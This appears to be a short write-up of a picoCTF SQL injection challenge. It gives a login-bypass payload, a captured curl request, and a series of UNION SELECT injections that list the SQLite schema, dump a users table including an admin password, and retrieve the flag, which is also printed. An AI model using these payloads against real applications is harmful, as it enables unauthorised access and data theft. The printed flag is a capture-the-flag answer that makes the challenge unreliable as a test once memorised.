password for login: test' OR 1 = 1 --

curl 'http://saturn.picoctf.net:63735/welcome.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=g0fsnc63dk44kplod0h2q6m5dc' \
  -H 'Origin: http://saturn.picoctf.net:63735' \
  -H 'Referer: http://saturn.picoctf.net:63735/welcome.php' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' \
  --data-raw 'search=&submit=Search' \
  --compressed \
  --insecure

search query:
select * from some_table where City = 'test'
select * from some_table where City = 'test' OR 1 = 1 --'

use UNION to join our query results into the row data

exploit sql injection:
test' UNION SELECT 1, 2, 3; --

test' UNION SELECT 1, (select sqlite_version()), 3; --

// this gives some information
test' UNION SELECT 1, ( SELECT name FROM sqlite_master) , 3; --

// get all table names
test' UNION SELECT name, sql, null from sqlite_master; --

- query:
test' UNION SELECT * from users; --
- response:
City	Address	Phone
admin	moreRandOMN3ss	1

// final query for getting the flag from more_table
test' UNION SELECT flag, null, null from more_table; --

flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
